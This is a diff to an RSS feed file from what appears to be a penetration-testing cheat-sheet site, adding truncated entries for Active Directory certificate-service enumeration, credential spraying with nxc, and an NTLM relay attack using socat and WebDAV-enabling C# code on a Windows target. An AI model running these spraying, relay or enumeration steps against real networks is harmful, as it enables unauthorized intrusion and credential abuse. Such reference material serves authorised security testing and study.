@@ -8,6 +8,13 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@ldap/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>ADCS</title>
+      <link>https://tldrbins.github.io/adcs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/adcs/</guid>
+      <description>Enum (From Linux) certipy-ad nxc certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser # Import ADCSTemplate module import-module .</description>
+    </item>
+    <item>
       <title>LDAP</title>
       <link>https://tldrbins.github.io/ldap/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -22,11 +29,11 @@
       <description>Basic Commands # Single user and password nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Single user and password (Active Directory) nxc &amp;lt;PROTOCOL&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; &amp;lt;TARGET&amp;gt; # Multiple users or passwords nxc &amp;lt;PROTOCOL&amp;gt; -u &amp;lt;USERNAMES&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; &amp;lt;TARGET&amp;gt; --continue-on-success # Match username to corresponding password nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USERNAMES&amp;gt; -p &amp;lt;PASSWORDS&amp;gt; --no-bruteforce --continue-on-success # With hash nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;LM&amp;gt;:&amp;lt;NT&amp;gt; # With Kerberos, or STATUS_ACCOUNT_RESTRICTION (NTLM disabled) nxc &amp;lt;PROTOCOL&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k &amp;lt;TARGET&amp;gt; Supported protocols +----------------------------------------------------------+ | ftp | ldap | mssql | rdp | smb | ssh | vnc | winrm | wmi | +----------------------------------------------------------+ RID Brute nxc smb &amp;lt;TARGET&amp;gt; -u guest -p &amp;#39;&amp;#39; --rid-brute 10000 User Enum (Authenticated) nxc smb &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; --users Ref: Download nxc</description>
     </item>
     <item>
-      <title>RPC</title>
-      <link>https://tldrbins.github.io/rpc/</link>
+      <title>NTLM Relay Attack</title>
+      <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/rpc/</guid>
-      <description>Remote Procedure Call Tools rpcclient impacket # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N &amp;lt;TARGET&amp;gt; # Connect with creds rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # Inline execute command rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -c &amp;#39;querydispinfo&amp;#39; Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup &amp;lt;RID&amp;gt; # Query group member by rid querygroupmem &amp;lt;RID&amp;gt; # Query user by rid queryuser &amp;lt;RID&amp;gt; # Look up a user lookupnames &amp;lt;USER&amp;gt; # Look up by SID lookupsids &amp;lt;SID&amp;gt; impacket-lookupsid &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; </description>
+      <guid>https://tldrbins.github.io/ntlm_relay_attack/</guid>
+      <description>NTLM Relay Attack 1. Run socat to redirect traffic (In Windows Target) # Upload socat.zip and unzip Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&amp;#39;c:\programdata\socat.zip&amp;#39;, &amp;#39;c:\programdata&amp;#39;) .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&amp;lt;LOCAL_IP&amp;gt;:80 Ref: socat&#xA;2. Enable webdav (In Windows Target) $Source = @&amp;#34; using System; using System.Text; using System.Security; using System.Collections.Generic; using System.Runtime.Versioning; using Microsoft.Win32.SafeHandles; using System.Runtime.InteropServices; using System.Diagnostics.CodeAnalysis; namespace JosL.WebClient{ public static class Starter{ [StructLayout(LayoutKind.Explicit, Size=16)] public class EVENT_DESCRIPTOR{ [FieldOffset(0)]ushort Id = 1; [FieldOffset(2)]byte Version = 0; [FieldOffset(3)]byte Channel = 0; [FieldOffset(4)]byte Level = 4; [FieldOffset(5)]byte Opcode = 0; [FieldOffset(6)]ushort Task = 0; [FieldOffset(8)]long Keyword = 0; } [StructLayout(LayoutKind.</description>
     </item>
   </channel>
 </rss>
